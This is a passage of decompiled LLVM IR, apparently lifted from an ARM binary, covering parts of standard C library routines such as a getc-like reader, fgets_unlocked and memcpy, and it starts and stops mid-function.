  %v2_18af0 = load i16, i16* %v1_18af0, align 2
  %v3_18af0 = zext i16 %v2_18af0 to i32
  %v1_18af4 = and i32 %v3_18af0, 131
  %tmp25 = icmp ugt i32 %v1_18af4, 128
  br i1 %tmp25, label %dec_label_pc_18b10, label %dec_label_pc_18b00

dec_label_pc_18b00:                               ; preds = %dec_label_pc_18af0
  store i32 128, i32* @r1, align 4
  %v0_18b04 = call i32 @__stdio_trans2r_o()
  store i32 %v0_18b04, i32* %r0.global-to-local, align 4
  %v2_18b08 = icmp eq i32 %v0_18b04, 0
  br i1 %v2_18b08, label %dec_label_pc_18b00.dec_label_pc_18b10_crit_edge, label %dec_label_pc_18bd8

dec_label_pc_18b00.dec_label_pc_18b10_crit_edge:  ; preds = %dec_label_pc_18b00
  %v0_18b10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18b10

dec_label_pc_18b10:                               ; preds = %dec_label_pc_18b00.dec_label_pc_18b10_crit_edge, %dec_label_pc_18af0
  %v2_18b50 = phi i32 [ %v0_18b10.pre, %dec_label_pc_18b00.dec_label_pc_18b10_crit_edge ], [ %v0_18ac8, %dec_label_pc_18af0 ]
  %v1_18b10 = inttoptr i32 %v2_18b50 to i16*
  %v2_18b10 = load i16, i16* %v1_18b10, align 2
  %v3_18b10 = zext i16 %v2_18b10 to i32
  store i32 %v3_18b10, i32* %r2.global-to-local, align 4
  %v1_18b14 = and i32 %v3_18b10, 2
  %v2_18b14 = icmp eq i32 %v1_18b14, 0
  br i1 %v2_18b14, label %dec_label_pc_18b40, label %dec_label_pc_18b1c

dec_label_pc_18b1c:                               ; preds = %dec_label_pc_18b10
  %tmp26 = urem i16 %v2_18b10, 2
  %v1_18b1c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_18b1c
  %v4_18b20 = and i32 %tmp22, 4
  %v5_18b20 = add i32 %v4_18b20, %v2_18b50
  %v1_18b24 = add i32 %v5_18b20, 36
  %v2_18b24 = inttoptr i32 %v1_18b24 to i8*
  %v3_18b24 = load i8, i8* %v2_18b24, align 1
  %v4_18b24 = zext i8 %v3_18b24 to i32
  %v1_18b28 = add nsw i32 %v3_18b10, -1
  store i32 %v1_18b28, i32* %r2.global-to-local, align 4
  store i32 %v4_18b24, i32* %r0.global-to-local, align 4
  %v2_18b34 = add i32 %v2_18b50, 40
  %v3_18b34 = inttoptr i32 %v2_18b34 to i32*
  store i32 0, i32* %v3_18b34, align 4
  %v0_18b38 = load i32, i32* %r2.global-to-local, align 4
  %v1_18b38 = trunc i32 %v0_18b38 to i16
  %v2_18b38 = load i32, i32* @r4, align 4
  %v3_18b38 = inttoptr i32 %v2_18b38 to i16*
  store i16 %v1_18b38, i16* %v3_18b38, align 2
  br label %dec_label_pc_18bdc

dec_label_pc_18b40:                               ; preds = %dec_label_pc_18b10
  %v1_18b40 = add i32 %v2_18b50, 16
  %v1_18b44 = inttoptr i32 %v1_18b40 to i32*
  %v2_18b44 = load i32, i32* %v1_18b44, align 4
  %v3_18b44 = add i32 %v2_18b50, 20
  %v4_18b44 = inttoptr i32 %v3_18b44 to i32*
  %v5_18b44 = load i32, i32* %v4_18b44, align 4
  %v9_18b48 = icmp eq i32 %v5_18b44, %v2_18b44
  br i1 %v9_18b48, label %dec_label_pc_18b58, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_18b40
  %v2_18b4c = inttoptr i32 %v2_18b44 to i8*
  %v3_18b4c = load i8, i8* %v2_18b4c, align 1
  %v4_18b4c = zext i8 %v3_18b4c to i32
  store i32 %v4_18b4c, i32* %r0.global-to-local, align 4
  %v6_18b4c = add i32 %v2_18b44, 1
  store i32 %v6_18b4c, i32* %v1_18b44, align 4
  br label %dec_label_pc_18bdc

dec_label_pc_18b58:                               ; preds = %dec_label_pc_18b40
  %v1_18b58 = add i32 %v2_18b50, 4
  %v2_18b58 = inttoptr i32 %v1_18b58 to i32*
  %v3_18b58 = load i32, i32* %v2_18b58, align 4
  %v7_18b5c = icmp eq i32 %v3_18b58, -2
  br i1 %v7_18b5c, label %.thread7, label %dec_label_pc_18b70

.thread7:                                         ; preds = %dec_label_pc_18b58
  %v2_18b60 = or i16 %v2_18b10, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_18b60, i16* %v1_18b10, align 2
  br label %dec_label_pc_18bdc

dec_label_pc_18b70:                               ; preds = %dec_label_pc_18b58
  %v1_18b70 = and i32 %v3_18b10, 768
  %v2_18b70 = icmp eq i32 %v1_18b70, 0
  br i1 %v2_18b70, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_18b70
  %v1_18b78 = load i32, i32* @r5, align 4
  %v3_18b78 = add i32 %v1_18b78, 76
  %v4_18b78 = inttoptr i32 %v3_18b78 to i32*
  %v5_18b78 = load i32, i32* %v4_18b78, align 4
  store i32 %v5_18b78, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_18b70, %bb23
  store i32 101248, i32* @lr, align 4
  %v1_18b7c = xor i1 %v2_18b70, true
  call void @__pseudo_cond_branch(i1 %v1_18b7c, i32 ptrtoint (i32* @global_var_18718.797 to i32))
  %v0_18b80 = load i32, i32* @r4, align 4
  %v1_18b80 = add i32 %v0_18b80, 8
  store i32 %v1_18b80, i32* %r2.global-to-local, align 4
  %v1_18b84 = inttoptr i32 %v1_18b80 to i32*
  %v2_18b84 = load i32, i32* %v1_18b84, align 4
  store i32 %v2_18b84, i32* %r2.global-to-local, align 4
  %v3_18b84 = add i32 %v0_18b80, 12
  %v4_18b84 = inttoptr i32 %v3_18b84 to i32*
  %v5_18b84 = load i32, i32* %v4_18b84, align 4
  %v9_18b88 = icmp eq i32 %v5_18b84, %v2_18b84
  br i1 %v9_18b88, label %dec_label_pc_18bbc, label %dec_label_pc_18b90

dec_label_pc_18b90:                               ; preds = %.thread9
  %v2_18b90 = add i32 %v0_18b80, 24
  %v3_18b90 = inttoptr i32 %v2_18b90 to i32*
  store i32 %v2_18b84, i32* %v3_18b90, align 4
  %v0_18b94 = load i32, i32* @r4, align 4
  store i32 %v0_18b94, i32* %r0.global-to-local, align 4
  %v2_18b98 = call i32 @__stdio_rfill(i32 %v0_18b94)
  store i32 %v2_18b98, i32* %r0.global-to-local, align 4
  %v2_18b9c = icmp eq i32 %v2_18b98, 0
  br i1 %v2_18b9c, label %dec_label_pc_18bd8, label %dec_label_pc_18ba4

dec_label_pc_18ba4:                               ; preds = %dec_label_pc_18b90
  %v0_18ba4 = load i32, i32* @r4, align 4
  %v1_18ba4 = add i32 %v0_18ba4, 20
  %v2_18ba4 = inttoptr i32 %v1_18ba4 to i32*
  %v3_18ba4 = load i32, i32* %v2_18ba4, align 4
  %v2_18ba8 = add i32 %v0_18ba4, 24
  %v3_18ba8 = inttoptr i32 %v2_18ba8 to i32*
  store i32 %v3_18ba4, i32* %v3_18ba8, align 4
  %v0_18bac = load i32, i32* @r4, align 4
  %v1_18bac = add i32 %v0_18bac, 16
  %v2_18bac = inttoptr i32 %v1_18bac to i32*
  %v3_18bac = load i32, i32* %v2_18bac, align 4
  %v1_18bb0 = inttoptr i32 %v3_18bac to i8*
  %v2_18bb0 = load i8, i8* %v1_18bb0, align 1
  %v3_18bb0 = zext i8 %v2_18bb0 to i32
  store i32 %v3_18bb0, i32* %r0.global-to-local, align 4
  %v5_18bb0 = add i32 %v3_18bac, 1
  store i32 %v5_18bb0, i32* %v2_18bac, align 4
  br label %dec_label_pc_18bdc

dec_label_pc_18bbc:                               ; preds = %.thread9
  %v1_18bbc = inttoptr i32 %v0_18b80 to i16*
  store i32 %v0_18b80, i32* %r0.global-to-local, align 4
  %v2_18bc0 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_18bc0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_18bc8 = call i32 @__stdio_READ(i16* %v1_18bbc, i32 %v2_18bc0, i32 1)
  store i32 %v5_18bc8, i32* %r0.global-to-local, align 4
  %v2_18bcc = icmp eq i32 %v5_18bc8, 0
  br i1 %v2_18bcc, label %dec_label_pc_18bd8, label %bb24

bb24:                                             ; preds = %dec_label_pc_18bbc
  %v4_18bd0 = load i8, i8* %stack_var_-17, align 1
  %v5_18bd0 = sext i8 %v4_18bd0 to i32
  store i32 %v5_18bd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18bdc

dec_label_pc_18bd8:                               ; preds = %dec_label_pc_18bbc, %dec_label_pc_18b00, %dec_label_pc_18b90
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18bdc

dec_label_pc_18bdc:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_18ba4, %dec_label_pc_18b1c, %dec_label_pc_18bd8
  %v2_18be0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18be0, i32* @r4, align 4
  store i32 %v6_18ac4, i32* @r5, align 4
  store i32 %v9_18ac4, i32* @lr, align 4
  %v1_18be4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18be4

; uselistorder directives
  uselistorder i32 %v2_18b44, { 1, 0, 2 }
  uselistorder i32 %v2_18b50, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_18ac8, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18bdc, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_18bd8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_18bf0 = load i32, i32* @r6, align 4
  %v12_18bf0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18bf4 = icmp eq i32 %arg2, 0
  store i1 %v2_18bf4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_18c7c, label %dec_label_pc_18c64.preheader

dec_label_pc_18c64.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_18c642 = add i32 %arg2, -1
  store i32 %v1_18c642, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_18c648 = icmp eq i32 %arg2, 1
  store i1 %v7_18c648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c648, label %dec_label_pc_18c6c, label %dec_label_pc_18c10

dec_label_pc_18c10:                               ; preds = %dec_label_pc_18c64.preheader, %dec_label_pc_18c64.backedge.dec_label_pc_18c10_crit_edge
  %v0_18c34 = phi i32 [ %v0_18c10.pre, %dec_label_pc_18c64.backedge.dec_label_pc_18c10_crit_edge ], [ %arg3, %dec_label_pc_18c64.preheader ]
  %v1_18c10 = add i32 %v0_18c34, 16
  %v2_18c10 = inttoptr i32 %v1_18c10 to i32*
  %v3_18c10 = load i32, i32* %v2_18c10, align 4
  store i32 %v3_18c10, i32* %r2.global-to-local, align 4
  %v1_18c14 = add i32 %v0_18c34, 24
  %v2_18c14 = inttoptr i32 %v1_18c14 to i32*
  %v3_18c14 = load i32, i32* %v2_18c14, align 4
  store i32 %v3_18c14, i32* %r3.global-to-local, align 4
  %v3_18c18 = icmp uge i32 %v3_18c10, %v3_18c14
  store i1 %v3_18c18, i1* %cpsr_c.global-to-local, align 1
  %v9_18c18 = icmp eq i32 %v3_18c10, %v3_18c14
  store i1 %v9_18c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18c18, label %dec_label_pc_18c34, label %dec_label_pc_18c20

dec_label_pc_18c20:                               ; preds = %dec_label_pc_18c10
  %v1_18c20 = inttoptr i32 %v3_18c10 to i8*
  %v2_18c20 = load i8, i8* %v1_18c20, align 1
  %v3_18c20 = zext i8 %v2_18c20 to i32
  store i32 %v3_18c20, i32* %r3.global-to-local, align 4
  %v5_18c20 = add i32 %v3_18c10, 1
  store i32 %v5_18c20, i32* %r2.global-to-local, align 4
  %v2_18c24 = load i32, i32* @r5, align 4
  %v3_18c24 = inttoptr i32 %v2_18c24 to i8*
  store i8 %v2_18c20, i8* %v3_18c24, align 1
  %v4_18c24 = load i32, i32* @r5, align 4
  %v5_18c24 = add i32 %v4_18c24, 1
  store i32 %v5_18c24, i32* @r5, align 4
  %v0_18c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_18c28 = icmp ugt i32 %v0_18c28, 9
  store i1 %v2_18c28, i1* %cpsr_c.global-to-local, align 1
  %v7_18c28 = icmp eq i32 %v0_18c28, 10
  store i1 %v7_18c28, i1* %cpsr_z.global-to-local, align 1
  %v0_18c2c = load i32, i32* %r2.global-to-local, align 4
  %v1_18c2c = load i32, i32* @r4, align 4
  %v2_18c2c = add i32 %v1_18c2c, 16
  %v3_18c2c = inttoptr i32 %v2_18c2c to i32*
  store i32 %v0_18c2c, i32* %v3_18c2c, align 4
  br i1 %v7_18c28, label %dec_label_pc_18c6c, label %dec_label_pc_18c64.backedge

dec_label_pc_18c34:                               ; preds = %dec_label_pc_18c10
  %v1_18c34 = inttoptr i32 %v0_18c34 to i16*
  %v3_18c38 = call i32 @getc_unlocked(i16* %v1_18c34)
  %v3_18c3c = icmp eq i32 %v3_18c38, -1
  store i1 %v3_18c3c, i1* %cpsr_c.global-to-local, align 1
  %v8_18c3c = icmp eq i32 %v3_18c38, -1
  store i1 %v8_18c3c, i1* %cpsr_z.global-to-local, align 1
  %v1_18c40 = urem i32 %v3_18c38, 256
  store i32 %v1_18c40, i32* %r3.global-to-local, align 4
  br i1 %v3_18c3c, label %dec_label_pc_18c48, label %dec_label_pc_18c60

dec_label_pc_18c48:                               ; preds = %dec_label_pc_18c34
  %v0_18c48 = load i32, i32* @r4, align 4
  %v1_18c48 = inttoptr i32 %v0_18c48 to i16*
  %v2_18c48 = load i16, i16* %v1_18c48, align 2
  %v3_18c48 = zext i16 %v2_18c48 to i32
  store i32 %v3_18c48, i32* %r3.global-to-local, align 4
  %v1_18c4c = and i32 %v3_18c48, 8
  %v2_18c4c = icmp eq i32 %v1_18c4c, 0
  store i1 %v2_18c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c4c, label %dec_label_pc_18c6c, label %dec_label_pc_18c7c

dec_label_pc_18c60:                               ; preds = %dec_label_pc_18c34
  %v1_18c58 = trunc i32 %v3_18c38 to i8
  %v2_18c58 = load i32, i32* @r5, align 4
  %v3_18c58 = inttoptr i32 %v2_18c58 to i8*
  store i8 %v1_18c58, i8* %v3_18c58, align 1
  %v4_18c58 = load i32, i32* @r5, align 4
  %v5_18c58 = add i32 %v4_18c58, 1
  store i32 %v5_18c58, i32* @r5, align 4
  %v0_18c5c = load i32, i32* %r3.global-to-local, align 4
  %v2_18c5c = icmp ugt i32 %v0_18c5c, 9
  store i1 %v2_18c5c, i1* %cpsr_c.global-to-local, align 1
  %v7_18c5c = icmp eq i32 %v0_18c5c, 10
  store i1 %v7_18c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c5c, label %dec_label_pc_18c6c, label %dec_label_pc_18c64.backedge

dec_label_pc_18c64.backedge:                      ; preds = %dec_label_pc_18c60, %dec_label_pc_18c20
  %v0_18c64 = load i32, i32* @r6, align 4
  %v1_18c64 = add i32 %v0_18c64, -1
  store i32 %v1_18c64, i32* @r6, align 4
  %v2_18c64 = icmp ne i32 %v0_18c64, 0
  store i1 %v2_18c64, i1* %cpsr_c.global-to-local, align 1
  %v7_18c64 = icmp eq i32 %v0_18c64, 1
  store i1 %v7_18c64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c64, label %dec_label_pc_18c6c, label %dec_label_pc_18c64.backedge.dec_label_pc_18c10_crit_edge

dec_label_pc_18c64.backedge.dec_label_pc_18c10_crit_edge: ; preds = %dec_label_pc_18c64.backedge
  %v0_18c10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18c10

dec_label_pc_18c6c:                               ; preds = %dec_label_pc_18c60, %dec_label_pc_18c64.backedge, %dec_label_pc_18c20, %dec_label_pc_18c64.preheader, %dec_label_pc_18c48
  %v0_18c6c = load i32, i32* @r5, align 4
  %v1_18c6c = load i32, i32* @r7, align 4
  %v3_18c6c = icmp uge i32 %v0_18c6c, %v1_18c6c
  store i1 %v3_18c6c, i1* %cpsr_c.global-to-local, align 1
  %v9_18c6c = icmp eq i32 %v0_18c6c, %v1_18c6c
  store i1 %v9_18c6c, i1* %cpsr_z.global-to-local, align 1
  %v2_18c70 = xor i1 %v9_18c6c, true
  %v3_18c70 = and i1 %v3_18c6c, %v2_18c70
  br i1 %v3_18c70, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_18c6c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_18c74 = inttoptr i32 %v0_18c6c to i8*
  store i8 0, i8* %v7_18c74, align 1
  %v0_18c78.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_18c78.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_18c6c, %bb
  %v1_18c78 = phi i1 [ %v1_18c78.pre, %bb ], [ %v9_18c6c, %dec_label_pc_18c6c ]
  %v0_18c78 = phi i1 [ %v0_18c78.pre, %bb ], [ %v3_18c6c, %dec_label_pc_18c6c ]
  %v2_18c78 = xor i1 %v1_18c78, true
  %v3_18c78 = and i1 %v0_18c78, %v2_18c78
  br i1 %v3_18c78, label %.dec_label_pc_18c80_crit_edge, label %dec_label_pc_18c7c

.dec_label_pc_18c80_crit_edge:                    ; preds = %.thread14
  %v0_18c80.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18c80

dec_label_pc_18c7c:                               ; preds = %entry, %dec_label_pc_18c48, %.thread14
  br label %dec_label_pc_18c80

dec_label_pc_18c80:                               ; preds = %.dec_label_pc_18c80_crit_edge, %dec_label_pc_18c7c
  %v0_18c80 = phi i32 [ %v0_18c80.pre, %.dec_label_pc_18c80_crit_edge ], [ 0, %dec_label_pc_18c7c ]
  store i32 %v9_18bf0, i32* @r6, align 4
  store i32 %v12_18bf0, i32* @r7, align 4
  ret i32 %v0_18c80

; uselistorder directives
  uselistorder i1 %v9_18c6c, { 1, 0, 2 }
  uselistorder i32 %v1_18c6c, { 1, 0 }
  uselistorder i32 %v0_18c6c, { 0, 2, 1 }
  uselistorder i32 %v0_18c64, { 2, 0, 1 }
  uselistorder i32 %v0_18c5c, { 1, 0 }
  uselistorder i32 %v3_18c38, { 2, 1, 0, 3 }
  uselistorder i32 %v0_18c28, { 1, 0 }
  uselistorder i32 %v3_18c10, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_18c34, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18c80, { 1, 0 }
  uselistorder label %dec_label_pc_18c7c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_18c6c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_18c10, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_18c90 = load i32, i32* @r1, align 4
  %v1_18c90 = load i32, i32* @r0, align 4
  %v2_18c90 = sub i32 %v0_18c90, %v1_18c90
  %v3_18c90 = icmp ult i32 %v0_18c90, %v1_18c90
  %v4_18c90 = xor i32 %v1_18c90, %v0_18c90
  %v5_18c90 = xor i32 %v2_18c90, %v0_18c90
  %v6_18c90 = and i32 %v5_18c90, %v4_18c90
  %v7_18c90 = icmp slt i32 %v6_18c90, 0
  store i1 %v7_18c90, i1* %cpsr_v.global-to-local, align 1
  %v8_18c90 = icmp slt i32 %v2_18c90, 0
  store i1 %v8_18c90, i1* %cpsr_n.global-to-local, align 1
  %v9_18c90 = icmp eq i32 %v0_18c90, %v1_18c90
  store i1 %v9_18c90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18c90, label %dec_label_pc_18ee4, label %dec_label_pc_18c98

dec_label_pc_18c98:                               ; preds = %entry
  br i1 %v9_18c90, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_18c98
  %merge = phi i32 [ %v0_18c90, %dec_label_pc_18c98 ], [ %v2_18f78, %bb150 ], [ %v11_18f94, %bb153 ], [ %v7_18f94, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_18c98
  %v5_18c9c = inttoptr i32 %v1_18c90 to i8*
  store i8* %v5_18c9c, i8** %stack_var_-8, align 4
  %v8_18c9c = load i32, i32* @lr, align 4
  %v0_18ca0 = load i32, i32* @r2, align 4
  %v2_18ca0 = add i32 %v0_18ca0, -4
  store i32 %v2_18ca0, i32* %r2.global-to-local, align 4
  %v4_18ca0 = sub i32 3, %v0_18ca0
  %v5_18ca0 = and i32 %v4_18ca0, %v0_18ca0
  %v6_18ca0 = icmp slt i32 %v5_18ca0, 0
  store i1 %v6_18ca0, i1* %cpsr_v.global-to-local, align 1
  %v7_18ca0 = icmp slt i32 %v2_18ca0, 0
  store i1 %v7_18ca0, i1* %cpsr_n.global-to-local, align 1
  %v8_18ca0 = icmp eq i32 %v0_18ca0, 4
  store i1 %v8_18ca0, i1* %cpsr_z.global-to-local, align 1
  %v5_18ca4 = icmp slt i32 %v0_18ca0, 4
  br i1 %v5_18ca4, label %bb140, label %dec_label_pc_18ca8

dec_label_pc_18ca8:                               ; preds = %bb
  %v1_18ca8 = urem i32 %v1_18c90, 4
  store i32 %v1_18ca8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18ca8 = icmp eq i32 %v1_18ca8, 0
  store i1 %v2_18ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ca8, label %dec_label_pc_18cb0, label %dec_label_pc_18d5c

dec_label_pc_18cb0:                               ; preds = %dec_label_pc_18ca8
  %v1_18cb0 = urem i32 %v0_18c90, 4
  store i32 %v1_18cb0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18cb0 = icmp eq i32 %v1_18cb0, 0
  store i1 %v2_18cb0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_18c90 to i2
  br i1 %v2_18cb0, label %dec_label_pc_18cb8, label %dec_label_pc_18d8c

dec_label_pc_18cb8:                               ; preds = %dec_label_pc_18cb0, %dec_label_pc_18d84
  %v0_18cd094 = phi i32 [ %v1_18c90, %dec_label_pc_18cb0 ], [ %v0_18eac77, %dec_label_pc_18d84 ]
  %v0_18ccc93 = phi i32 [ %v0_18c90, %dec_label_pc_18cb0 ], [ %v0_18d84, %dec_label_pc_18d84 ]
  %v0_18cb8 = phi i32 [ %v2_18ca0, %dec_label_pc_18cb0 ], [ %v2_18d7c, %dec_label_pc_18d84 ]
  %v1_18cb8 = add i32 %v0_18cb8, -8
  store i32 %v1_18cb8, i32* %r2.global-to-local, align 4
  %v3_18cb8 = sub i32 7, %v0_18cb8
  %v4_18cb8 = and i32 %v3_18cb8, %v0_18cb8
  %v5_18cb8 = icmp slt i32 %v4_18cb8, 0
  store i1 %v5_18cb8, i1* %cpsr_v.global-to-local, align 1
  %v6_18cb8 = icmp slt i32 %v1_18cb8, 0
  store i1 %v6_18cb8, i1* %cpsr_n.global-to-local, align 1
  %v7_18cb8 = icmp eq i32 %v0_18cb8, 8
  store i1 %v7_18cb8, i1* %cpsr_z.global-to-local, align 1
  %v2_18cbc = xor i1 %v6_18cb8, %v5_18cb8
  br i1 %v2_18cbc, label %dec_label_pc_18d0c, label %dec_label_pc_18cc0

dec_label_pc_18cc0:                               ; preds = %dec_label_pc_18cb8
  %v1_18cc0 = add i32 %v0_18cb8, -28
  store i32 %v1_18cc0, i32* %r2.global-to-local, align 4
  %v3_18cc0 = sub i32 27, %v0_18cb8
  %v4_18cc0 = and i32 %v3_18cc0, %v1_18cb8
  %v5_18cc0 = icmp slt i32 %v4_18cc0, 0
  store i1 %v5_18cc0, i1* %cpsr_v.global-to-local, align 1
  %v6_18cc0 = icmp slt i32 %v1_18cc0, 0
  store i1 %v6_18cc0, i1* %cpsr_n.global-to-local, align 1
  %v7_18cc0 = icmp eq i32 %v1_18cb8, 20
  store i1 %v7_18cc0, i1* %cpsr_z.global-to-local, align 1
  %v2_18cc4 = xor i1 %v6_18cc0, %v5_18cc0
  br i1 %v2_18cc4, label %dec_label_pc_18cf8, label %dec_label_pc_18cc8

dec_label_pc_18cc8:                               ; preds = %dec_label_pc_18cc0
  %v0_18cc8 = load i32, i32* @r4, align 4
  store i32 %v0_18cc8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18ccc

dec_label_pc_18ccc:                               ; preds = %dec_label_pc_18ccc.dec_label_pc_18ccc_crit_edge, %dec_label_pc_18cc8
  %v0_18cd0 = phi i32 [ %v12_18cd8, %dec_label_pc_18ccc.dec_label_pc_18ccc_crit_edge ], [ %v0_18cd094, %dec_label_pc_18cc8 ]
  %v0_18ccc = phi i32 [ %v0_18ccc.pre, %dec_label_pc_18ccc.dec_label_pc_18ccc_crit_edge ], [ %v0_18ccc93, %dec_label_pc_18cc8 ]
  %v1_18ccc = inttoptr i32 %v0_18ccc to i32*
  %v2_18ccc = load i32, i32* %v1_18ccc, align 4
  %v3_18ccc = add i32 %v0_18ccc, 4
  %v4_18ccc = inttoptr i32 %v3_18ccc to i32*
  %v5_18ccc = load i32, i32* %v4_18ccc, align 4
  store i32 %v5_18ccc, i32* %r4.global-to-local, align 4
  %v6_18ccc = add i32 %v0_18ccc, 8
  %v7_18ccc = inttoptr i32 %v6_18ccc to i32*
  %v8_18ccc = load i32, i32* %v7_18ccc, align 4
  store i32 %v8_18ccc, i32* %ip.global-to-local, align 4
  %v9_18ccc = add i32 %v0_18ccc, 12
  %v10_18ccc = inttoptr i32 %v9_18ccc to i32*
  %v11_18ccc = load i32, i32* %v10_18ccc, align 4
  store i32 %v11_18ccc, i32* %lr.global-to-local, align 4
  %v12_18ccc = add i32 %v0_18ccc, 16
  store i32 %v12_18ccc, i32* %r1.global-to-local, align 4
  %v1_18cd0 = inttoptr i32 %v0_18cd0 to i32*
  store i32 %v2_18ccc, i32* %v1_18cd0, align 4
  %v3_18cd0 = add i32 %v0_18cd0, 4
  %v4_18cd0 = inttoptr i32 %v3_18cd0 to i32*
  %v5_18cd0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18cd0, i32* %v4_18cd0, align 4
  %v6_18cd0 = add i32 %v0_18cd0, 8
  %v7_18cd0 = inttoptr i32 %v6_18cd0 to i32*
  %v8_18cd0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_18cd0, i32* %v7_18cd0, align 4
  %v9_18cd0 = add i32 %v0_18cd0, 12
  %v10_18cd0 = inttoptr i32 %v9_18cd0 to i32*
  %v11_18cd0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18cd0, i32* %v10_18cd0, align 4
  %v12_18cd0 = add i32 %v0_18cd0, 16
  store i32 %v12_18cd0, i32* %r0.global-to-local, align 4
  %v0_18cd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_18cd4 = inttoptr i32 %v0_18cd4 to i32*
  %v2_18cd4 = load i32, i32* %v1_18cd4, align 4
  store i32 %v2_18cd4, i32* @r3, align 4
  %v3_18cd4 = add i32 %v0_18cd4, 4
  %v4_18cd4 = inttoptr i32 %v3_18cd4 to i32*
  %v5_18cd4 = load i32, i32* %v4_18cd4, align 4
  store i32 %v5_18cd4, i32* %r4.global-to-local, align 4
  %v6_18cd4 = add i32 %v0_18cd4, 8
  %v7_18cd4 = inttoptr i32 %v6_18cd4 to i32*
  %v8_18cd4 = load i32, i32* %v7_18cd4, align 4
  store i32 %v8_18cd4, i32* @ip, align 4
  %v9_18cd4 = add i32 %v0_18cd4, 12
  %v10_18cd4 = inttoptr i32 %v9_18cd4 to i32*
  %v11_18cd4 = load i32, i32* %v10_18cd4, align 4
  store i32 %v11_18cd4, i32* %lr.global-to-local, align 4
  %v12_18cd4 = add i32 %v0_18cd4, 16
  store i32 %v12_18cd4, i32* @r1, align 4
  %v1_18cd8 = inttoptr i32 %v12_18cd0 to i32*
